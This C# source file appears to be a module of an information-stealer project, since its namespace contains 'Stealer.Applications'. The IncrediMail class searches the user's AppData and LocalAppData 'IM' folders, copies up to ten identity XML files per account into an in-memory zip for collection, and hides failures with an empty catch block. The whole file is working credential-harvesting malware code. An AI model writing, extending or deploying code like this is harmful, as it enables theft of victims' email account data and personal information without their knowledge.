using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class IncrediMail : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "IM");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "IM");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "IncrediMail";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string identitiesPath = Path.Combine(basePath, "Identities");
                if (Directory.Exists(identitiesPath))
                {
                    string[] identityDirs = Directory.GetDirectories(identitiesPath, "*", SearchOption.TopDirectoryOnly);

                    foreach (string identityDir in identityDirs)
                    {
                        string identityName = Path.GetFileName(identityDir);

                        string[] xmlFiles = Directory.GetFiles(identityDir, "*.xml", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in xmlFiles.Take(10))
                        {
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Applications\\IncrediMail\\{location}\\{identityName}\\{fileName}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
